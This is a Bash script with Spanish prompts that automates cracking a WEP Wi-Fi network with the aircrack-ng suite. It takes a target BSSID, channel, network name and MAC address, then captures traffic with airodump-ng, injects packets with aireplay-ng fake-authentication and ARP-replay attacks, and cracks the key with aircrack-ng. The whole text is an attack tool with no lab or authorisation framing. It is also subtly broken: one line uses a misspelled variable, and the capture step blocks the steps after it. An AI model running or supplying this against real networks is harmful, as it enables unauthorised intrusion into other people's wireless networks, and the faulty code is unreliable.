#!/bin/bash

echo "introduce el canal"
read canal
echo "introduce el nombre del fichero"
read fichero
echo "introduce la bssid"
read bssid
echo "introduce el nombre del wifi"
read name
echo "introduce tu mac"
read mac

echo "#!/bin/bash" > airodum.sh
echo "airodump-ng -c $canal -w $fichero --bssid $bssid wlan0 " >> airodum.sh
chmod +x airodum.sh
bash airodum.sh
echo "#!/bin/bash" > airplay.sh
echo "aireplay-ng -1 0 -a $bssi -h $mac -e $name wlan0 &" >> airplay.sh
chmod +x airplay.sh
bash airplay.sh
echo "#!/bin/bash" > airplay2.sh
echo "aireplay-ng -3 -b $bssid -h $mac wlan0 &" >> airplay2.sh
chmod +x airplay2.sh
bash airplay2.sh
echo "#!/bin/bash" > aircrack.sh
echo "aircrack-ng $fichero &" >> aircrack.sh
chmod +x aircrack.sh
bash aircrack.sh

